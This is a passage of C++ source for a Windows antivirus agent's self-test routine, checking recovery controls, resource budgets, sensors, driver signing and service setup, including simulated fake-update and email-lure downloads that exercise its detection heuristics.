      const auto enabledSet = SetBreakGlassModeEnabled(true, &enableError);
      const auto enabledObserved = QueryBreakGlassModeEnabled();
      const auto disabledSet = SetBreakGlassModeEnabled(false, &disableError);
      const auto disabledObserved = !QueryBreakGlassModeEnabled();

      const auto restored = SetBreakGlassModeEnabled(originalBreakGlassState, &restoreError);
      const auto restoredObserved = QueryBreakGlassModeEnabled() == originalBreakGlassState;

      if (enabledSet && enabledObserved && disabledSet && disabledObserved && restored && restoredObserved) {
        AddCheck(report, L"phase6_breakglass_recovery_controls",
                 L"Phase 6 break-glass and local recovery controls", SelfTestStatus::Pass,
                 L"Break-glass control toggled enable/disable and restored prior state successfully for local recovery governance.");
      } else {
        AddCheck(report, L"phase6_breakglass_recovery_controls",
                 L"Phase 6 break-glass and local recovery controls", SelfTestStatus::Fail,
                 L"Break-glass lifecycle controls did not complete enable/disable/restore flow. enabledSet=" +
                     std::wstring(enabledSet ? L"true" : L"false") + L", disabledSet=" +
                     std::wstring(disabledSet ? L"true" : L"false") + L", restored=" +
                     std::wstring(restored ? L"true" : L"false") + L".",
                 L"Validate break-glass registry persistence and local recovery control flow before promotion.");
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase6_breakglass_recovery_controls",
               L"Phase 6 break-glass and local recovery controls", SelfTestStatus::Fail,
               L"Phase 6 break-glass validation failed: " + Utf8ToWide(error.what()),
               L"Validate break-glass persistence and rerun self-test.");
    }

    const auto mirrorLegacyCheck = [&report](const std::wstring& sourceId, const std::wstring& targetId,
                                              const std::wstring& targetName) {
      const auto source = std::find_if(report.checks.begin(), report.checks.end(), [&](const auto& check) {
        return check.id == sourceId;
      });

      if (source == report.checks.end()) {
        AddCheck(report, targetId, targetName, SelfTestStatus::Fail,
                 L"Legacy source check " + sourceId + L" was not present in self-test output.",
                 L"Publish the source check before promoting Phase 6 governance gates.");
        return;
      }

      AddCheck(report, targetId, targetName, source->status,
               L"Mirrored from " + sourceId + L": " + source->details,
               source->remediation);
    };

    mirrorLegacyCheck(L"phase5_pam_request_queue_visibility", L"phase6_pam_request_queue_visibility",
                      L"Phase 6 PAM request queue visibility");
    mirrorLegacyCheck(L"phase5_pam_audit_visibility", L"phase6_pam_audit_visibility",
                      L"Phase 6 PAM audit visibility");
    mirrorLegacyCheck(L"phase5_household_role_policy_governance", L"phase6_household_role_governance",
                      L"Phase 6 household role governance");
    mirrorLegacyCheck(L"phase5_admin_baseline_persistence", L"phase6_admin_baseline_persistence",
                      L"Phase 6 admin baseline persistence");

    try {
      const auto workingSetBytes = QueryCurrentProcessWorkingSetBytes();
      const auto sampledCpuPercent = SampleCurrentProcessCpuPercent();
      constexpr double kPhase7TargetWorkingSetMb = 250.0;
      constexpr int kPhase7TargetCpuPercent = 2;

      if (!workingSetBytes.has_value() || !sampledCpuPercent.has_value()) {
        AddCheck(report, L"phase7_resource_budget_snapshot", L"Phase 7 resource budget snapshot",
                 SelfTestStatus::Warning,
                 L"Resource budget sampling was unavailable in this run context.",
                 L"Run self-test on an endpoint host context that allows process memory and CPU sampling for Phase 7 gates.");
      } else {
        const auto workingSetMb = static_cast<double>(*workingSetBytes) / (1024.0 * 1024.0);
        if (workingSetMb <= kPhase7TargetWorkingSetMb && *sampledCpuPercent <= kPhase7TargetCpuPercent) {
          AddCheck(report, L"phase7_resource_budget_snapshot", L"Phase 7 resource budget snapshot",
                   SelfTestStatus::Pass,
                   L"Resource snapshot met initial Phase 7 service targets (workingSetMb=" +
                       std::to_wstring(workingSetMb) + L", cpuPercent=" +
                       std::to_wstring(*sampledCpuPercent) + L").");
        } else {
          AddCheck(report, L"phase7_resource_budget_snapshot", L"Phase 7 resource budget snapshot",
                   SelfTestStatus::Warning,
                   L"Resource snapshot exceeded one or more Phase 7 initial targets (workingSetMb=" +
                       std::to_wstring(workingSetMb) + L", cpuPercent=" +
                       std::to_wstring(*sampledCpuPercent) + L").",
                   L"Tune service memory/cpu overhead until Phase 7 idle resource budgets are consistently met.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase7_resource_budget_snapshot", L"Phase 7 resource budget snapshot",
               SelfTestStatus::Fail,
               L"Phase 7 resource-budget sampling failed: " + Utf8ToWide(error.what()),
               L"Validate resource telemetry helpers and rerun self-test.");
    }

    try {
      const auto versionInfo = QueryWindowsVersionInfo();
      if (!versionInfo.has_value()) {
        AddCheck(report, L"phase7_windows_compatibility_baseline",
                 L"Phase 7 Windows compatibility baseline", SelfTestStatus::Warning,
                 L"Could not query Windows version details for compatibility gate evaluation.",
                 L"Run self-test on a supported Windows 10/11 host with version APIs available.");
      } else {
        const auto family = ClassifyWindowsFamily(*versionInfo);
        if (family == L"windows10" || family == L"windows11") {
          AddCheck(report, L"phase7_windows_compatibility_baseline",
                   L"Phase 7 Windows compatibility baseline", SelfTestStatus::Pass,
                   L"Host compatibility baseline is supported (family=" + family + L", build=" +
                       std::to_wstring(versionInfo->build) + L").");
        } else {
          AddCheck(report, L"phase7_windows_compatibility_baseline",
                   L"Phase 7 Windows compatibility baseline", SelfTestStatus::Fail,
                   L"Host version is outside supported Windows 10/11 baseline (major=" +
                       std::to_wstring(versionInfo->major) + L", minor=" +
                       std::to_wstring(versionInfo->minor) + L", build=" +
                       std::to_wstring(versionInfo->build) + L").",
                   L"Validate Phase 7 compatibility on Windows 10 and Windows 11 baselines before stable promotion.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase7_windows_compatibility_baseline",
               L"Phase 7 Windows compatibility baseline", SelfTestStatus::Fail,
               L"Phase 7 compatibility baseline check failed: " + Utf8ToWide(error.what()),
               L"Validate Windows compatibility gate instrumentation and rerun self-test.");
    }

    {
      const auto source = std::find_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
        return check.id == L"phase4_release_gate_blockers";
      });

      if (source == report.checks.end()) {
        AddCheck(report, L"phase7_release_promotion_gates",
                 L"Phase 7 stable promotion gate enforcement", SelfTestStatus::Fail,
                 L"Release-promotion gate source check was not present (phase4_release_gate_blockers missing).",
                 L"Publish release-promotion gate validation in self-test before Phase 7 promotion.");
      } else {
        AddCheck(report, L"phase7_release_promotion_gates",
                 L"Phase 7 stable promotion gate enforcement",
                 source->status == SelfTestStatus::Pass ? SelfTestStatus::Pass : SelfTestStatus::Fail,
                 L"Mirrored from phase4_release_gate_blockers: " + source->details,
                 source->remediation);
      }
    }

    try {
      const auto coexistenceSnapshot = WscCoexistenceManager().CaptureSnapshot();
      if (!coexistenceSnapshot.available) {
        AddCheck(report, L"phase7_defender_companion_mode",
                 L"Phase 7 Defender companion-mode posture", SelfTestStatus::Warning,
                 L"Windows Security Center coexistence snapshot was unavailable in this host context.",
                 L"Validate companion-mode posture on a host where WSC APIs are available.");
      } else {
        const auto defenderPresent = std::any_of(
            coexistenceSnapshot.products.begin(), coexistenceSnapshot.products.end(), [](const auto& product) {
              return ToLowerCopy(product.name).find(L"defender") != std::wstring::npos;
            });
        const auto fenrirPrimary = std::any_of(
            coexistenceSnapshot.products.begin(), coexistenceSnapshot.products.end(), [](const auto& product) {
              const auto name = ToLowerCopy(product.name);
              return product.isDefault &&
                     (name.find(L"fenrir") != std::wstring::npos || name.find(L"antivirus") != std::wstring::npos);
            });

        if (defenderPresent && !fenrirPrimary) {
          AddCheck(report, L"phase7_defender_companion_mode",
                   L"Phase 7 Defender companion-mode posture", SelfTestStatus::Pass,
                   L"WSC snapshot shows Defender present while Fenrir is not primary, matching companion-mode rollout posture.");
        } else if (defenderPresent) {
          AddCheck(report, L"phase7_defender_companion_mode",
                   L"Phase 7 Defender companion-mode posture", SelfTestStatus::Warning,
                   L"Defender is present but Fenrir appears to be primary in WSC default-product posture.",
                   L"Keep companion mode with Defender during stable validation unless promotion policy explicitly changes primary AV posture.");
        } else {
          AddCheck(report, L"phase7_defender_companion_mode",
                   L"Phase 7 Defender companion-mode posture", SelfTestStatus::Warning,
                   L"Defender product was not visible in WSC coexistence snapshot.",
                   L"Validate companion-mode coexistence behavior on representative household Windows hosts.");
        }
      }
    } catch (const std::exception& error) {
      AddCheck(report, L"phase7_defender_companion_mode",
               L"Phase 7 Defender companion-mode posture", SelfTestStatus::Fail,
               L"Phase 7 Defender companion-mode check failed: " + Utf8ToWide(error.what()),
               L"Validate WSC coexistence checks and rerun self-test.");
    }

    std::error_code cleanupError;
    std::filesystem::remove_all(phaseValidationRoot, cleanupError);
  }

  const auto corpusFileLimit = ResolveCorpusFileLimit();
  const auto runOptionalCorpusCheck = [&report, corpusFileLimit](const std::wstring& checkId,
                                                                  const std::wstring& checkName,
                                                                  const wchar_t* envVarName,
                                                                  const std::wstring& corpusLabel) {
    const auto configuredPath = ReadEnvironmentVariable(envVarName);
    if (configuredPath.empty()) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Warning,
               corpusLabel + L" corpus path is not configured for this self-test run.",
               std::wstring(L"Set ") + envVarName + L" to a trusted corpus root and rerun --self-test.");
      return;
    }

    const std::filesystem::path corpusRoot(configuredPath);
    std::error_code error;
    if (!std::filesystem::exists(corpusRoot, error) || error) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
               corpusLabel + L" corpus path does not exist: " + corpusRoot.wstring() + L".",
               std::wstring(L"Update ") + envVarName + L" to an existing corpus path.");
      return;
    }

    bool truncated = false;
    const auto sampleFiles = CollectCorpusSampleFiles(corpusRoot, corpusFileLimit, &truncated);
    if (sampleFiles.empty()) {
      AddCheck(report, checkId, checkName, SelfTestStatus::Fail,
               corpusLabel + L" corpus path did not yield any readable files: " + corpusRoot.wstring() + L".",
               L"Ensure the corpus contains readable files and rerun self-test from the same host context.");
      return;
    }

    auto corpusPolicy = CreateDefaultPolicySnapshot();
    corpusPolicy.cloudLookupEnabled = false;
    corpusPolicy.quarantineOnMalicious = false;

    const auto findings = ScanTargets(sampleFiles, corpusPolicy);
    if (findings.empty()) {
      std::wstring details = L"Validated ";
      details += std::to_wstring(sampleFiles.size());
      details += L" ";
      details += corpusLabel;
      details += L" corpus file(s) without false-positive findings.";
      if (truncated) {
        details += L" Scan was limited to first ";
        details += std::to_wstring(corpusFileLimit);
        details += L" files.";
      }

      AddCheck(report, checkId, checkName, SelfTestStatus::Pass, details);
      return;
    }

    std::wstring details = L"Detected ";
    details += std::to_wstring(findings.size());
    details += L" false-positive candidate(s) in the ";
    details += corpusLabel;
    details += L" corpus.";
    const auto sampleCount = std::min<std::size_t>(findings.size(), 3);
    for (std::size_t index = 0; index < sampleCount; ++index) {
      const auto& finding = findings[index];
      details += L" Sample ";
      details += std::to_wstring(index + 1);
      details += L": ";
      details += finding.path.wstring();
      details += L" (";
      details += VerdictDispositionToString(finding.verdict.disposition);
      details += L", reason ";
      details += FirstReasonCode(finding);
      details += L").";
    }

    AddCheck(report, checkId, checkName, SelfTestStatus::Fail, details,
             L"Review suppression/reputation tuning for these cleanware artifacts before pilot rollout.");
  };

  runOptionalCorpusCheck(L"phase1_cleanware_corpus", L"Phase 1 cleanware corpus",
                         L"ANTIVIRUS_PHASE1_CLEANWARE_CORPUS_PATH", L"cleanware");
  runOptionalCorpusCheck(L"phase1_uk_business_software_corpus", L"Phase 1 UK business software corpus",
                         L"ANTIVIRUS_PHASE1_UK_BUSINESS_CORPUS_PATH", L"UK business software");

  const auto simulatedBrowserOrigin =
      BuildContentOriginContext(std::filesystem::path(L"C:\\Users\\Public\\Downloads\\Chrome_Update.exe"),
                                L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", {},
                                L"https://support-update-example.test/redirect?continue=https://support-update-example.test",
                                CurrentUtcTimestamp());
  const auto browserSignals =
      CollectContentOriginSignals(simulatedBrowserOrigin,
                                  std::filesystem::path(L"C:\\Users\\Public\\Downloads\\Chrome_Update.exe"));
  AddCheck(report, L"browser_context_awareness", L"Browser-aware protection context",
           simulatedBrowserOrigin.browserOriginated && simulatedBrowserOrigin.downloadOriginated &&
                   simulatedBrowserOrigin.fakeUpdatePattern && !browserSignals.empty()
               ? SelfTestStatus::Pass
               : SelfTestStatus::Fail,
           simulatedBrowserOrigin.browserOriginated
               ? L"Browser context classified family " + simulatedBrowserOrigin.browserFamily +
                     L" with navigation " + simulatedBrowserOrigin.navigationType + L"."
               : L"Browser-origin download classification did not activate as expected.",
           L"Verify browser lineage, download tagging, and fake-update heuristics.");

  const auto simulatedEmailOrigin =
      BuildContentOriginContext(std::filesystem::path(L"C:\\Users\\Public\\Downloads\\Invoice_Reset_Password.zip"),
                                L"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", {}, L"",
                                CurrentUtcTimestamp());
  const auto emailSignals =
      CollectContentOriginSignals(simulatedEmailOrigin,
                                  std::filesystem::path(L"C:\\Users\\Public\\Downloads\\Invoice_Reset_Password.zip"));
  AddCheck(report, L"email_context_awareness", L"Email-aware protection context",
           simulatedEmailOrigin.attachmentOriginated && simulatedEmailOrigin.suspiciousLureName &&
                   simulatedEmailOrigin.passwordProtectedArchivePattern && !emailSignals.empty()
               ? SelfTestStatus::Pass
               : SelfTestStatus::Fail,
           simulatedEmailOrigin.attachmentOriginated
               ? L"Email attachment context classification and lure scoring activated."
               : L"Email-origin attachment classification did not activate as expected.",
           L"Validate mail-client lineage and archive-lure scoring inputs.");

  const auto hardeningManager = HardeningManager(config, installRoot);
  const auto hardeningStatus = hardeningManager.QueryStatus();
  AddCheck(report, L"hardening", L"Service hardening",
           hardeningStatus.registryConfigured && hardeningStatus.runtimePathsTrusted &&
                   hardeningStatus.runtimePathsProtected
               ? SelfTestStatus::Pass
               : SelfTestStatus::Warning,
           hardeningStatus.statusMessage.empty() ? L"Hardening status is available." : hardeningStatus.statusMessage,
           L"Run fenrir-agent-service.exe --repair from an elevated context to reapply registry and ACL hardening.");

  AddCheck(report, L"protected_service", L"Protected-service posture",
           hardeningStatus.launchProtectedConfigured
               ? SelfTestStatus::Pass
               : (!hardeningStatus.elamDriverPresent && config.elamDriverPath.empty() ? SelfTestStatus::Warning
                                                                                       : SelfTestStatus::Fail),
           hardeningStatus.launchProtectedConfigured
               ? L"The antimalware-light protected-service posture is configured."
               : (hardeningStatus.elamDriverPresent || !config.elamDriverPath.empty()
                      ? L"An ELAM path is configured, but launch-protected service mode is not active."
                      : L"No ELAM driver is configured in this environment."),
           L"Supply a signed ELAM driver and run --repair --elam-driver <path> from an elevated installer context.");

  const auto wscSnapshot = WscCoexistenceManager().CaptureSnapshot();
  AddCheck(report, L"coexistence", L"Windows coexistence snapshot",
           wscSnapshot.available ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           wscSnapshot.available ? L"WSC health: " + wscSnapshot.providerHealth : wscSnapshot.errorMessage,
           L"Validate this from a Windows client endpoint with the Security Center service available.");

  try {
    auto etwConfig = config;
    ProcessEtwSensor sensor(etwConfig);
    sensor.Start();
    std::this_thread::sleep_for(std::chrono::milliseconds(350));
    sensor.Stop();
    auto telemetry = sensor.DrainTelemetry();
    const auto started =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"process.etw.started"; });
    const auto failed =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"process.etw.failed"; });
    if (started != telemetry.end()) {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Pass, started->summary);
    } else if (failed != telemetry.end()) {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry",
               IsProbablyPrivilegeBoundary(failed->summary) || failed->payloadJson.find(L"\"error\":5") != std::wstring::npos
                   ? SelfTestStatus::Warning
                   : SelfTestStatus::Fail,
               failed->summary,
               L"Run the sensor under the Windows service account or an elevated context to validate kernel ETW access.");
    } else {
      AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Warning,
               L"The ETW sensor did not emit a start or failure state event during self-test.",
               L"Validate the kernel ETW session from an elevated service context.");
    }
  } catch (const std::exception& error) {
    AddCheck(report, L"etw_process_sensor", L"ETW process telemetry", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Check TDH/ETW dependencies and validate under the SCM service context.");
  }

  try {
    auto wfpConfig = config;
    NetworkIsolationManager networkManager(wfpConfig);
    networkManager.Start();
    std::wstring isolationError;
    bool isolationToggled = false;
    if (networkManager.EngineReady()) {
      isolationToggled = networkManager.ApplyIsolation(true, &isolationError);
      if (isolationToggled) {
        networkManager.ApplyIsolation(false, nullptr);
      }
    }
    auto telemetry = networkManager.DrainTelemetry();
    networkManager.Stop();

    const auto failed =
        std::find_if(telemetry.begin(), telemetry.end(), [](const auto& record) { return record.eventType == L"network.wfp.failed"; });
    if (networkManager.EngineReady() && isolationToggled) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", SelfTestStatus::Pass,
               L"The WFP manager opened the filtering engine and applied/released host isolation.");
    } else if (failed != telemetry.end()) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager",
               (!elevated || IsProbablyPrivilegeBoundary(failed->summary) ||
                failed->payloadJson.find(L"\"error\":5") != std::wstring::npos)
                   ? SelfTestStatus::Warning
                   : SelfTestStatus::Fail,
               failed->summary,
               L"Validate WFP provider registration and isolation from an elevated service or SYSTEM context.");
    } else if (!isolationError.empty()) {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", elevated ? SelfTestStatus::Fail : SelfTestStatus::Warning,
               isolationError, L"Run the self-test from an elevated context that can open the WFP engine.");
    } else {
      AddCheck(report, L"wfp_isolation", L"WFP isolation manager", elevated ? SelfTestStatus::Fail : SelfTestStatus::Warning,
               L"The WFP manager did not reach an engine-ready state in this context.",
               L"Validate the network containment path from the installed Windows service.");
    }
  } catch (const std::exception& error) {
    AddCheck(report, L"wfp_isolation", L"WFP isolation manager", SelfTestStatus::Fail, Utf8ToWide(error.what()),
             L"Check WFP dependencies, ACLs, and service privileges.");
  }

  const auto minifilterInf = installRoot / L"driver" / L"AntivirusMinifilter.inf";
  const auto minifilterSys = installRoot / L"driver" / L"AntivirusMinifilter.sys";
  const auto minifilterCat = installRoot / L"driver" / L"AntivirusMinifilter.cat";
  const auto minifilterServiceState = QueryServiceState(kMinifilterServiceName);
  const auto minifilterServiceRunning = _wcsicmp(minifilterServiceState.c_str(), L"running") == 0;
  const auto minifilterArtifactsPresent = PathExists(minifilterInf) || PathExists(minifilterSys) || PathExists(minifilterCat);
  AddCheck(report, L"minifilter", L"Minifilter package",
         minifilterServiceRunning ? SelfTestStatus::Pass : SelfTestStatus::Fail,
           minifilterServiceRunning
               ? L"The minifilter service is registered and running."
               : (minifilterServiceState.empty()
                      ? (minifilterArtifactsPresent ? L"Driver packaging artifacts are present, but the minifilter service is not installed."
                                                   : L"No built minifilter artifacts were found beside the agent binaries.")
                      : L"The minifilter service is registered but not running (state " + minifilterServiceState + L")."),
         L"Build and sign the minifilter, stage AntivirusMinifilter.inf/.sys/.cat into the release package, and install the minifilter service.");

  const auto minifilterInfPresent = PathExists(minifilterInf);
  const auto minifilterSysPresent = PathExists(minifilterSys);
  const auto minifilterCatPresent = PathExists(minifilterCat);
  if (minifilterInfPresent && minifilterSysPresent && minifilterCatPresent) {
    AddCheck(report, L"minifilter_artifacts", L"Minifilter release artifacts", SelfTestStatus::Pass,
             L"INF, SYS, and CAT artifacts were found in the release layout.");
  } else {
    std::wstring missing;
    if (!minifilterInfPresent) {
      missing += L"INF ";
    }
    if (!minifilterSysPresent) {
      missing += L"SYS ";
    }
    if (!minifilterCatPresent) {
      missing += L"CAT ";
    }

    AddCheck(report, L"minifilter_artifacts", L"Minifilter release artifacts", SelfTestStatus::Fail,
             L"Minifilter release layout is missing: " + missing,
             L"Run the release layout build with staged minifilter SYS/CAT payloads before packaging.");
  }

  if (minifilterSysPresent || minifilterCatPresent) {
    const auto sysSigned = minifilterSysPresent && VerifyFileAuthenticodeSignature(minifilterSys);
    const auto catSigned = minifilterCatPresent && VerifyFileAuthenticodeSignature(minifilterCat);
    const auto sysSigner = minifilterSysPresent ? QueryFileSignerSubject(minifilterSys) : std::wstring();
    const auto catSigner = minifilterCatPresent ? QueryFileSignerSubject(minifilterCat) : std::wstring();

    const auto signingStatus = (sysSigned && catSigned) ? SelfTestStatus::Pass : SelfTestStatus::Fail;
    AddCheck(report, L"minifilter_signing", L"Minifilter signing posture", signingStatus,
             L"SYS signed=" + std::wstring(sysSigned ? L"true" : L"false") +
                 L" (signer=" + (sysSigner.empty() ? L"(none)" : sysSigner) + L"); CAT signed=" +
                 std::wstring(catSigned ? L"true" : L"false") +
                 L" (signer=" + (catSigner.empty() ? L"(none)" : catSigner) + L").",
             L"Sign both AntivirusMinifilter.sys and AntivirusMinifilter.cat with the release signing chain before production rollout.");
  } else {
    AddCheck(report, L"minifilter_signing", L"Minifilter signing posture", SelfTestStatus::Fail,
             L"Minifilter SYS/CAT payloads were not present, so signing posture could not be validated.",
             L"Stage signed AntivirusMinifilter.sys and AntivirusMinifilter.cat into the release package before self-test.");
  }

  const auto serviceState = QueryServiceState(L"FenrirAgent");
  AddCheck(report, L"service_registration", L"Windows service registration",
           !serviceState.empty() ? SelfTestStatus::Pass : SelfTestStatus::Warning,
           !serviceState.empty() ? L"The FenrirAgent service is registered with state " + serviceState + L"."
                                 : L"The FenrirAgent service is not installed in the SCM on this host.",
           L"Run fenrir-agent-service.exe --install from an elevated install context.");

  const auto runtimeRoot = runtimeValidation.runtimeRootPath.empty() ? config.runtimeDatabasePath.parent_path()
                                                                      : runtimeValidation.runtimeRootPath;
  const auto addRuntimeRootAvailabilityCheck = [&report](const std::wstring& id, const std::wstring& name,
                                                          const std::filesystem::path& rootPath,
                                                          const std::wstring& remediation) {
    std::error_code error;
    std::filesystem::create_directories(rootPath, error);
    if (!error && PathExists(rootPath)) {
      AddCheck(report, id, name, SelfTestStatus::Pass, L"The root is available at " + rootPath.wstring() + L".");
      return;
    }

    AddCheck(report, id, name, SelfTestStatus::Fail,
             L"The root could not be prepared at " + rootPath.wstring() + L".", remediation);
  };

  addRuntimeRootAvailabilityCheck(L"runtime_root", L"Runtime root", runtimeRoot,
                                  L"Ensure the configured runtime root is writable before starting the service.");
  addRuntimeRootAvailabilityCheck(L"update_root", L"Update staging root", config.updateRootPath,
                                  L"Ensure the runtime update directory is writable before testing rollback-aware upgrades.");
  addRuntimeRootAvailabilityCheck(L"quarantine_root", L"Quarantine root", config.quarantineRootPath,
                                  L"Ensure local quarantine storage is writable by the service account.");
  addRuntimeRootAvailabilityCheck(L"evidence_root", L"Evidence root", config.evidenceRootPath,
                                  L"Ensure local evidence storage is writable by the service account.");
  addRuntimeRootAvailabilityCheck(L"journal_root", L"Journal root", config.journalRootPath,
                                  L"Ensure the local journal path is writable for audit and recovery events.");

  const auto failures = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Fail; });
  const auto warnings = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Warning; });
  report.overallStatus = failures > 0 ? L"fail" : warnings > 0 ? L"warning" : L"pass";

  try {
    RuntimeDatabase database(config.runtimeDatabasePath);
    const auto derivePhase = [](const std::wstring& checkId) {
      if (checkId.starts_with(L"phase")) {
        const auto separator = checkId.find(L'_');
        return separator == std::wstring::npos ? checkId : checkId.substr(0, separator);
      }
      return std::wstring(L"core");
    };

    for (const auto& check : report.checks) {
      database.UpsertSelfTestOutcomeRecord(SelfTestOutcomeRecord{
          .checkId = check.id,
          .checkName = check.name,
          .status = StatusToString(check.status),
          .details = check.details,
          .remediation = check.remediation,
          .phase = derivePhase(check.id),
          .buildVersion = config.agentVersion,
          .recordedAt = report.generatedAt});
    }

    const auto phase2Total = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
      return check.id.starts_with(L"phase2_");
    });
    const auto phase2Pass = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
      return check.id.starts_with(L"phase2_") && check.status == SelfTestStatus::Pass;
    });
    const auto phase2Fail = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
      return check.id.starts_with(L"phase2_") && check.status == SelfTestStatus::Fail;
    });

    if (phase2Total > 0) {
      const auto qualityScore = static_cast<std::uint32_t>(std::clamp(
          static_cast<int>((phase2Pass * 100) / phase2Total), 0, 100));
      database.UpsertRuleQualityRecord(RuleQualityRecord{
          .ruleCode = L"phase2_selftest_summary",
          .phase = L"phase2",
          .maliciousHits = static_cast<std::uint32_t>(phase2Pass),
          .benignHits = static_cast<std::uint32_t>(phase2Fail),
          .totalEvaluations = static_cast<std::uint32_t>(phase2Total),
          .qualityScore = qualityScore,
          .summary = L"Aggregated Phase 2 self-test quality snapshot.",
          .details = L"phase2Pass=" + std::to_wstring(phase2Pass) + L", phase2Fail=" +
              std::to_wstring(phase2Fail),
          .updatedAt = report.generatedAt});
    }
  } catch (...) {
  }

  return report;
}

std::wstring SelfTestReportToJson(const SelfTestReport& report) {
  std::wstring json = L"{\"generatedAt\":\"" + JsonEscape(report.generatedAt) + L"\",\"overallStatus\":\"" +
                      JsonEscape(report.overallStatus) + L"\",\"checks\":[";
  for (std::size_t index = 0; index < report.checks.size(); ++index) {
    const auto& check = report.checks[index];
    if (index != 0) {
      json += L",";
    }
    json += L"{\"id\":\"" + JsonEscape(check.id) + L"\",\"name\":\"" + JsonEscape(check.name) + L"\",\"status\":\"" +
            JsonEscape(StatusToString(check.status)) + L"\",\"details\":\"" + JsonEscape(check.details) +
            L"\",\"remediation\":\"" + JsonEscape(check.remediation) + L"\"}";
  }

  const auto totalChecks = report.checks.size();
  const auto passCount = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.status == SelfTestStatus::Pass;
  });
  const auto warningCount = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.status == SelfTestStatus::Warning;
  });
  const auto failCount = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.status == SelfTestStatus::Fail;
  });

  const auto phase2Total = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.id.starts_with(L"phase2_");
  });
  const auto phase2Pass = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.id.starts_with(L"phase2_") && check.status == SelfTestStatus::Pass;
  });
  const auto phase2Warning = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.id.starts_with(L"phase2_") && check.status == SelfTestStatus::Warning;
  });
  const auto phase2Fail = std::count_if(report.checks.begin(), report.checks.end(), [](const auto& check) {
    return check.id.starts_with(L"phase2_") && check.status == SelfTestStatus::Fail;
  });
  const auto phase2PassRatePercent =
      phase2Total == 0 ? 0.0 : (static_cast<double>(phase2Pass + phase2Warning) * 100.0 / static_cast<double>(phase2Total));

  json += L"],\"summary\":{\"totalChecks\":" + std::to_wstring(totalChecks) + L",\"pass\":" +
          std::to_wstring(passCount) + L",\"warning\":" + std::to_wstring(warningCount) + L",\"fail\":" +
          std::to_wstring(failCount) + L",\"phase2\":{\"total\":" + std::to_wstring(phase2Total) +
          L",\"pass\":" + std::to_wstring(phase2Pass) + L",\"warning\":" +
          std::to_wstring(phase2Warning) + L",\"fail\":" + std::to_wstring(phase2Fail) +
          L",\"passRatePercent\":" + std::to_wstring(phase2PassRatePercent) + L"}}}";
  return json;
}

int SelfTestExitCode(const SelfTestReport& report) {
  const auto failures = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Fail; });
  if (failures > 0) {
    return 2;
  }

  const auto warnings = std::count_if(report.checks.begin(), report.checks.end(),
                                      [](const auto& check) { return check.status == SelfTestStatus::Warning; });
  return warnings > 0 ? 1 : 0;
}

}  // namespace antivirus::agent
